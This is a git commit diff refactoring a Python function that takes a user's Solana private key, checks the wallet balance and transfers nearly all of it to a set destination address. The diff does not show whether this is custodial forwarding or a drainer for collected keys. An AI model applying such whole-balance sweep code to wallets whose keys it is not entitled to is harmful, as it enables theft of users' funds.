4bf78911fa958b834aeddb175e00af2ba8626056
daviddan-241 <ovourcross@gmail.com>
2026-05-02 04:31:06 +0100

    Update solana.py

--- chains/solana.py
+++ chains/solana.py
@@ -1,46 +1,45 @@
 from solders.keypair import Keypair
 from solders.pubkey import Pubkey
 from solders.system_program import transfer, TransferParams
-from solders.transaction import Transaction
 from solana.rpc.api import Client
 from solana.rpc.types import TxOpts
+from solders.transaction import Transaction
 from config import SOLANA_RPC_URL
 
 client = Client(SOLANA_RPC_URL)
 
 def forward(private_key: str, destination: str, user_id: int):
     try:
-        # Convert private key string to bytes
-        secret_key = bytes(map(int, private_key.split(",")))
-        keypair = Keypair.from_bytes(secret_key)
+        secret = bytes(map(int, private_key.split(",")))
+        keypair = Keypair.from_bytes(secret)
 
         from_pubkey = keypair.pubkey()
         to_pubkey = Pubkey.from_string(destination)
 
-        # Get balance
-        balance_resp = client.get_balance(from_pubkey)
-        balance = balance_resp.value
+        balance = client.get_balance(from_pubkey).value
 
-        if balance > 5000:
-            txn = Transaction.new_signed_with_payer(
-                [
-                    transfer(
-                        TransferParams(
-                            from_pubkey=from_pubkey,
-                            to_pubkey=to_pubkey,
-                            lamports=balance - 5000
-                        )
+        if balance <= 5000:
+            print(f"[SOL] Not enough balance user {user_id}")
+            return
+
+        tx = Transaction.new_signed_with_payer(
+            [
+                transfer(
+                    TransferParams(
+                        from_pubkey=from_pubkey,
+                        to_pubkey=to_pubkey,
+                        lamports=balance - 5000
                     )
-                ],
-                payer=from_pubkey,
-                signing_keypairs=[keypair],
-                recent_blockhash=client.get_latest_blockhash().value.blockhash,
-            )
+                )
+            ],
+            payer=from_pubkey,
+            signing_keypairs=[keypair],
+            recent_blockhash=client.get_latest_blockhash().value.blockhash,
+        )
 
-            client.send_transaction(txn, opts=TxOpts(skip_confirmation=False))
-            print(f"[Solana] Successfully forwarded funds for user {user_id}.")
-        else:
-            print(f"[Solana] Not enough balance for user {user_id}.")
+        client.send_transaction(tx, opts=TxOpts(skip_confirmation=False))
+
+        print(f"[SOL] Forwarded user {user_id}")
 
     except Exception as e:
-        print(f"[Solana Error] User ID {user_id}: {e}")
+        print(f"[SOL ERROR] {user_id}: {e}")
